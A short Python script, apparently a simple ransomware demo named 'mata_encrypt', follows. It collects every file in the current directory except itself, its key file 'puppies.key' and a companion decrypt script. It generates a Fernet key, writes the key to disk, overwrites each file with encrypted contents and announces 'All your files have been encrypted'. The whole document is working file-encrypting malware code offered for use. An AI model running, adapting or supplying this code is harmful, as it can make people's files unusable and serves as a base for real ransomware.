#!/usr/bin/env python3

import os # allows to go through directories
from cryptography.fernet import Fernet # allows to encrypt and decrypt

files = []
# search all files
for file in os.listdir():
	if file != "mata_encrypt-1.0.py" and file != "puppies.key" and file != "mata_decrypt-1.0.py":
		if os.path.isfile(file): # check that isn't a directory
			files.append(file)

print(files) # print all that will be encrypted on the directory

key = Fernet.generate_key() # generates a random key

with open("puppies.key", "wb") as thekey: # create a file that will contain passwd
	thekey.write(key) # write the passwd

for file in files: # go through all files and encrypt them
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All your files have been encrypted")
